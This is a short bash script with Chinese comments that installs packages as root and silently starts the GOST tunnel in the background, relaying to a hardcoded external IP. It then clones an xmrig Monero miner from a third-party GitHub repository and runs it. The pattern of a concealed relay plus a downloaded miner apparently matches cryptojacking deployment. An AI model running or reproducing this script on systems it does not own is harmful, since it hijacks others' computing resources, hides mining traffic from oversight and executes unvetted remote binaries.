#!/bin/bash
set -e

# ── 重试函数 ──
retry() {
    local max=$1 delay=$2; shift 2
    local n=1
    while true; do
        "$@" && return 0
        if [ $n -lt $max ]; then
            n=$((n + 1))
            echo "[重试] 第${n}次 (${delay}s后)..."
            sleep $delay
        else
            echo "[失败] 重试${max}次后仍失败: $*"
            return 1
        fi
    done
}

# ── 1. 安装依赖 (apt 可能锁住, 多试几次) ──
echo "[1/5] 更新源..."
retry 5 10 apt update
echo "[1/5] 安装 wget git unzip..."
retry 5 10 apt install -y wget git unzip

# ── 2. 下载 GOST (网络不稳定, 多试几次) ──
echo "[2/5] 下载 GOST..."
retry 10 6 wget -q --show-progress https://github.com/ginuerzh/gost/releases/download/v2.12.0/gost_2.12.0_linux_amd64.tar.gz
echo "[2/5] GOST 下载完成"

# ── 3. 安装 GOST ──
echo "[3/5] 安装 GOST..."
tar -zxf gost_2.12.0_linux_amd64.tar.gz
mv gost /usr/local/bin
chmod +x /usr/local/bin/gost
echo "[3/5] gost 已安装到 /usr/local/bin/gost"

# ── 4. 启动 GOST 后台 ──
echo "[4/5] 启动 GOST..."
nohup gost -L=tcp://:3335 -F=relay+wss://158.247.199.230:9999 >/dev/null 2>&1 &
sleep 4
if pgrep -f "gost -L" > /dev/null; then
    echo "[4/5] GOST 后台运行中"
else
    echo "[4/5] ⚠ GOST 进程未检测到, 但继续执行"
fi

# ── 5. 下载并运行 xmrig ──
echo "[5/5] 下载 xmrig..."
rm -rf moneroocean
retry 5 10 git clone https://github.com/mdfitnhtingint/moneroocean.git
cd moneroocean
unzip -o moneroocean.zip
chmod +x xmrig
echo "[5/5] 启动 xmrig..."
./xmrig
